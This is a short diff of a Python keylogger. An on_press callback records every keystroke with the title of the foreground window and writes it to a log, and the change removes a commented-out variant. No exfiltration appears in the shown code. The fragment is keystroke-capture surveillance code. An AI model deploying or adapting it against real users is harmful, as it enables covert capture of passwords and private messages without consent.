@@ -10,10 +10,6 @@ def on_press(Key):
     log_str = str(Key) + " | " + GetWindowText(GetForegroundWindow())
     print(log_str)
     logging.info(log_str)
-    '''
-    log_str = key.char + " | " + GetWindowText(GetForegroundWindow())
-    print(log_str)
-    '''
     
 with Listener(on_press=on_press) as listener:
     listener.join()
